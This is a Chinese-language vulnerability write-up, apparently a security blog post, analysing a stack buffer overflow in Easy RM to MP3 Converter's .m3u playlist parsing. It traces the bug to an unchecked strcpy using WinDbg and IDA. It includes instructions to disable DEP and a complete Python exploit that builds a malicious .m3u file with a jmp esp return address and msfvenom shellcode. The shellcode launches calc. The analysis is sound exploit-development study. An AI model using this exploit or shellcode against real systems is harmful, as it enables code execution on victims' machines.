---
title: EasyRM2MP3 栈溢出分析
date: '2018-08-14 17:50'
tags:
  - stack overflow
categories: Vulnerability Analysis
keywords:
  - stack overflow
  - EasyRM2MP3
translate_title: easyrm2mp3-stack-overflow-analysis
---

# 0x01 漏洞信息
Easy RM to MP3 Converter 是一款音频文件格式转换工具，根据 Exploit-DB 给出的[信息](https://www.exploit-db.com/exploits/9186/)可知，该工具在转换 .m3u 文件时存在栈溢出漏洞。此外，漏洞程序可在 Exploit-DB 中下载。

# 0x02 漏洞分析
调试环境如下：
>操作系统：Windows7 SP1 64 bits  
>调试器：Windbg 10.0.10586

由于 Windows7 系统默认开启 DEP 保护，利用该漏洞时，为了返回到栈上执行 shellcode，需要把系统 DEP 关闭。  
（1）“命令运行符” -> “以管理员身份运行”；  
（2）运行 bcdedit.exe/set {current} nx AlwaysOff；  
（3）重启计算机生效。

## 1. 漏洞复现
首先使用以下脚本生成一个 .m3u 文件。
```python
payload = 30000 * "A"
f = open("crash.m3u","w")
f.write(payload)
```
WinDbg 中直接运行程序，加载 crash.m3u 文件后将会触发栈溢出，此时 eip 寄存器值为 0x41414141。
```python
(ddc.10b0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=00164a1c ecx=7701387a edx=00580600 esi=76942960 edi=00007530
eip=41414141 esp=0015f614 ebp=006031c8 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
41414141 ??              ???
```
使用 mona.py 插件可计算出覆盖 eip 所需要填充的字符数量为 26094，从而精确控制 eip 指向的地址。
```python
offset = 26094
payload = offset*"A" + "B"*4
f = open("crash.m3u","w")
f.write(payload)
```
再次运行程序并加载 crash.m3u 文件，可看到 eip 执行 0x42424242。
```python
(da0.ae0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=00164a1c ecx=7701387a edx=00590600 esi=76942960 edi=000065f2
eip=42424242 esp=0015f614 ebp=005b31c8 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
42424242 ??              ???
```

## 2. 漏洞定位
由于程序崩溃时，查看调用栈不能得到有效的信息，无法通过栈回溯的方法定位到漏洞位置。
```python
0:000> kb
 # ChildEBP RetAddr  Args to Child
WARNING: Frame IP not in any known module. Following frames may be wrong.
00 0015f610 00000000 00000006 00164a1c 00000001 0x42424242
```
因为该程序未开启 ASLR，所以每次运行时栈中缓冲区的地址都相同。此外，栈溢出漏洞触发时必须要往缓冲区写数据，因此，在缓冲区起始地址处设置内存写断点，即可找到漏洞位置。

首先需要计算出缓冲区起始地址，程序崩溃时，esp-8 的位置为覆盖返回地址的数据。
```python
0:000> d esp-8
0015f60c  42424242 005b3100 00000000 00000006
0015f61c  00164a1c 00000001 00000000 005c0000
0015f62c  41414141 41414141 41414141 41414141
0015f63c  41414141 41414141 41414141 41414141
```
根据前面计算出的偏移量，可倒推出缓冲区起始地址为 0x‭15901E‬（0x0015f60c-26094）。重新运行程序，使用以下命令设置断点后继续运行，载入文件之前触发的断点无需关注。
```python
0:000> ba w 1 0x15901e
0:000> bl
 0 e 0015901e w 1 0001 (0001)  0:**** 
0:000> g
```
载入 crash.m3u 文件后继续运行，可触发 2 次断点。第二次断下的位置为 MSRMfilter03!Playlist_FindNextItem+0x53 （0x10008d93），该指令进行数据拷贝操作，即为漏洞触发点。
```python
Breakpoint 0 hit
eax=00000000 ebx=00164a1c ecx=0000087b edx=06317540 esi=76942960 edi=00159020
eip=0041e318 esp=00156ce4 ebp=002731c8 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
image00400000+0x1e318:
0041e318 f3ab            rep stos dword ptr es:[edi]
0:000> g
Breakpoint 0 hit
eax=00000000 ebx=00164a1c ecx=0000197c edx=00006605 esi=06ed14a4 edi=00159020
eip=10008d93 esp=00156cc8 ebp=002731c8 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
MSRMfilter03!Playlist_FindNextItem+0x53:
10008d93 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
0:000> dd 0x15901e
0015901e  00004141 00000000 00000000 00000000
0015902e  00000000 00000000 00000000 00000000
0015903e  00000000 00000000 00000000 00000000
```
此时查看调用栈如下，MSRMfilter03!Playlist_FindNextItem 在 image00400000 中调用，且返回地址为 0041e3f6。
```python
0:000> kb
 # ChildEBP RetAddr  Args to Child
WARNING: Stack unwind information not available. Following frames may be wrong.
00 00156cd8 0041e3f6 0015900c 000065f2 76942960 MSRMfilter03!Playlist_FindNextItem+0x53
01 00156cdc 0015900c 000065f2 76942960 002731c8 image00400000+0x1e3f6
02 00156ce0 00000000 76942960 002731c8 00164a1c 0x15900c
0:000> g
Breakpoint 0 hit
eax=00006605 ebx=00164a1c ecx=000010b9 edx=00156d04 esi=0015b32c edi=00159024
eip=0041e553 esp=00156ce4 ebp=002731c8 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
image00400000+0x1e553:
0041e553 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
0:000> dd 0x15901e
0015901e  41414141 41414141 41414141 41414141
0015902e  41414141 41414141 41414141 41414141
0015903e  41414141 41414141 41414141 41414141
0015904e  41414141 41414141 41414141 41414141
```

## 3. 漏洞成因
使用 IDA 加载 MSRMfilter03.dll，跟进到 0x10008d93 分析可知，Playlist_FindNextItem() 函数中使用 strcpy 将 v1 复制给 a1 时未进行长度检查，当复制过长数据到 a1 时会导致栈溢出。
```C
signed int __cdecl Playlist_FindNextItem(char *a1)
{
  const char *v1; // eax
  signed int result; // eax

  sub_10008DE0(5, aDebugPlaylistF, aDMpf20Mplayerm, 192);
  v1 = (const char *)sub_10006850((int)dword_1004D600, 1);
  if ( v1 )
  {
    strcpy(a1, v1);    // overflow!!!
    sub_10008DE0(5, aDebugPlaylistF_0, aDMpf20Mplayerm, 205);
    result = 1;
  }
  else
  {
    sub_10008DE0(5, aDebugPlaylistF_1, aDMpf20Mplayerm, 201);
    result = 0;
  }
  return result;
}
```
接下来分析 strcpy 的两个参数，源字符串 v1 为 sub_10006850 函数的返回值。
```python
0:000> u 10008D5E
MSRMfilter03!Playlist_FindNextItem+0x1e:
10008d5e e8eddaffff      call    MSRMfilter03+0x6850 (10006850)
10008d63 83c418          add     esp,18h
10008d66 85c0            test    eax,eax
10008d68 7444            je      MSRMfilter03!Playlist_FindNextItem+0x6e (10008dae)
10008d6a 56              push    esi
0:000> bu 10008d5e
0:000> bl
 0 e 10008d5e     0001 (0001)  0:**** MSRMfilter03!Playlist_FindNextItem+0x1e
```
因此在调用该函数的位置下断点，程序断下时查看其返回值为文件路径加上输入的数据。
```python
0:000> bu MSRMfilter03!Playlist_FindNextItem+0x1e
0:000> bl
 0 eu             0001 (0001) (MSRMfilter03!Playlist_FindNextItem+0x1e)
0:000> g
Breakpoint 0 hit
eax=02900600 ebx=00164a1c ecx=7701387a edx=02900700 esi=005f31e4 edi=0015f60c
eip=10008d5e esp=00156cc4 ebp=005f31c8 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
MSRMfilter03!Playlist_FindNextItem+0x1e:
10008d5e e8eddaffff      call    MSRMfilter03+0x6850 (10006850)
0:000> p
eax=06e71490 ebx=00164a1c ecx=029005a0 edx=00000000 esi=005f31e4 edi=0015f60c
eip=10008d63 esp=00156cc4 ebp=005f31c8 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
MSRMfilter03!Playlist_FindNextItem+0x23:
10008d63 83c418          add     esp,18h
0:000> dc eax
06e71490  455c3a44 6f6c7078 565c7469 70416c75  D:\Exploit\VulAp
06e714a0  41415c70 41414141 41414141 41414141  p\AAAAAAAAAAAAAA
06e714b0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
06e714c0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
06e714d0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
```
接着分析目的字符串 a1，a1 为 Playlist_FindNextItem() 函数调用时传入的参数，根据函数调用栈可回溯到其调用位置在 RM2MP3Converter.exe 模块的 sub_41E2B0 函数中，可以看到是一个函数指针调用，其传入的参数为栈中的地址 [esp+8928h+Str]。
```C
.text:0041E3D8                 mov     ecx, 880h
.text:0041E3DD                 xor     eax, eax
.text:0041E3DF                 lea     edi, [esp+8928h+var_2200]
.text:0041E3E6                 rep stosd
.text:0041E3E8 ; 82:   while ( (*(int (__cdecl **)(char *))(v2 + 25714))(&Str) )
.text:0041E3E8                 lea     ecx, [esp+8928h+Str]
.text:0041E3EF                 push    ecx
.text:0041E3F0                 call    dword ptr [ebx+6472h]   // call MSRMfilter03!Playlist_FindNextItem()
.text:0041E3F6                 add     esp, 4
.text:0041E3F9                 test    eax, eax
.text:0041E3FB                 jz      loc_41E9D2
```
切换到伪代码界面，看到参数 Str 与 ebp 的偏移量为 0x6600 = 18(路径字符串长度) + 26094。
```C
 int v46; // [esp+18h] [ebp-8910h]
  unsigned int v47; // [esp+1Ch] [ebp-890Ch]
  char ArgList; // [esp+20h] [ebp-8908h]
  char v49; // [esp+2224h] [ebp-6704h]
  char Str; // [esp+2328h] [ebp-6600h]
  char v51; // [esp+232Bh] [ebp-65FDh]
  char v52[8704]; // [esp+4528h] [ebp-4400h]
  char v53; // [esp+6728h] [ebp-2200h]
```
至此，已分析完漏洞成因，程序中处理文件中读取的数据时，未对输入数据长度进行检查的情况下，使用 strcpy 将其复制到栈中，从而可能导致栈溢出漏洞。

# 0x03 漏洞利用
在关闭 DEP 的情况下，可以把 shellcode 写入栈中，通过溢出覆盖返回地址为 `jmp esp` 指令的地址，跳转到栈中执行 shellcode。由于系统 DLL 加载时的内存基址相对固定，且在系统重启之前都不会改变，所以使用系统 DLL 中的跳板指令可较稳定地利用漏洞。
```python
0:000> !py mona jmp -r esp -m kernel32
Hold on...
                             ...
[+] Writing results to C:\mona_files\RM2MP3Converter_2572\jmp.txt
    - Number of pointers of type 'jmp esp' : 1 
    - Number of pointers of type 'call esp' : 2 
[+] Results : 
0x75ee3165 |   0x75ee3165 (b+0x00093165)  : jmp esp |  {PAGE_EXECUTE_READ} [kernel32.dll] ASLR: True, Rebase: False, SafeSEH: True, OS: True, v6.1.7601.17617 (C:\Windows\syswow64\kernel32.dll)
0x75e80233 |   0x75e80233 (b+0x00030233)  : call esp |  {PAGE_EXECUTE_READ} [kernel32.dll] ASLR: True, Rebase: False, SafeSEH: True, OS: True, v6.1.7601.17617 (C:\Windows\syswow64\kernel32.dll)
0x75f02e2b |   0x75f02e2b (b+0x000b2e2b)  : call esp |  {PAGE_EXECUTE_READ} [kernel32.dll] ASLR: True, Rebase: False, SafeSEH: True, OS: True, v6.1.7601.17617 (C:\Windows\syswow64\kernel32.dll)
    Found a total of 3 pointers
```
这里使用结果中的第一项 0x75ee3165 进行利用。
```python
import struct

offset = 26094
ret_addr = 0x75ee3165   # address of "jmp esp"

# msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -b '\x00\x0a' -f python -v shellcode
shellcode =  "\x90"*30
shellcode += "\xda\xc7\xd9\x74\x24\xf4\x5a\x2b\xc9\xbb\x29\xe7"
shellcode += "\xb6\xd8\xb1\x31\x31\x5a\x18\x03\x5a\x18\x83\xc2"
shellcode += "\x2d\x05\x43\x24\xc5\x4b\xac\xd5\x15\x2c\x24\x30"
shellcode += "\x24\x6c\x52\x30\x16\x5c\x10\x14\x9a\x17\x74\x8d"
shellcode += "\x29\x55\x51\xa2\x9a\xd0\x87\x8d\x1b\x48\xfb\x8c"
shellcode += "\x9f\x93\x28\x6f\x9e\x5b\x3d\x6e\xe7\x86\xcc\x22"
shellcode += "\xb0\xcd\x63\xd3\xb5\x98\xbf\x58\x85\x0d\xb8\xbd"
shellcode += "\x5d\x2f\xe9\x13\xd6\x76\x29\x95\x3b\x03\x60\x8d"
shellcode += "\x58\x2e\x3a\x26\xaa\xc4\xbd\xee\xe3\x25\x11\xcf"
shellcode += "\xcc\xd7\x6b\x17\xea\x07\x1e\x61\x09\xb5\x19\xb6"
shellcode += "\x70\x61\xaf\x2d\xd2\xe2\x17\x8a\xe3\x27\xc1\x59"
shellcode += "\xef\x8c\x85\x06\xf3\x13\x49\x3d\x0f\x9f\x6c\x92"
shellcode += "\x86\xdb\x4a\x36\xc3\xb8\xf3\x6f\xa9\x6f\x0b\x6f"
shellcode += "\x12\xcf\xa9\xfb\xbe\x04\xc0\xa1\xd4\xdb\x56\xdc"
shellcode += "\x9a\xdc\x68\xdf\x8a\xb4\x59\x54\x45\xc2\x65\xbf"
shellcode += "\x22\x3c\x2c\xe2\x02\xd5\xe9\x76\x17\xb8\x09\xad"
shellcode += "\x5b\xc5\x89\x44\x23\x32\x91\x2c\x26\x7e\x15\xdc"
shellcode += "\x5a\xef\xf0\xe2\xc9\x10\xd1\x80\x8c\x82\xb9\x68"
shellcode += "\x2b\x23\x5b\x75"

payload = "A"*offset + struct.pack("<I",ret_addr) + "B"*4 + shellcode

f = open("crash.m3u","w")
f.write(payload)
```
以上 exp 中有 2 点需要注意的。
1. 由于是跳转到栈顶 esp 中执行 shellcode，eip 与 esp 的位置是紧挨着的，shellcode 执行过程中如果需要修改栈中数据将有可能把 shellcode 指令部分修改，因此要在 shellcode 前面预留一段内存作为栈空间，这里填充了 30 个 0x90。

2. 由于 sub_41E2B0 函数在返回时使用 `retn 4` 清栈。
```C
.text:0041E9D9                 mov     eax, 1
.text:0041E9DE                 pop     esi
.text:0041E9DF                 pop     ebp
.text:0041E9E0 ; 208:   dword_47BEA8 = 1;
.text:0041E9E0                 mov     dword_47BEA8, eax
.text:0041E9E5                 pop     ebx
.text:0041E9E6                 add     esp, 8918h
.text:0041E9EC                 retn    4
.text:0041E9EC sub_41E2B0      endp
```
 `retn 4` 具体操作如下，因此需要在 shellcode 前填充 4 个字节，才能通过 `jmp esp` 跳转到 shellcode 中执行。
```C
pop eip
跳转到 eip
add esp, 4
```
____
References:   
[1] [A Tale of Exploit "Easy RM 2 MP3](https://r00tk1ts.github.io/2018/06/24/A%20Tale%20of%20Exploit%20Easy%20RM%202%20MP3%20Converter/)   
[2] [Learn Corelan Exploit Writing Part 1](https://larry.ngrep.me/2018/08/04/learn-corelan-exploit-writing-part-one/)
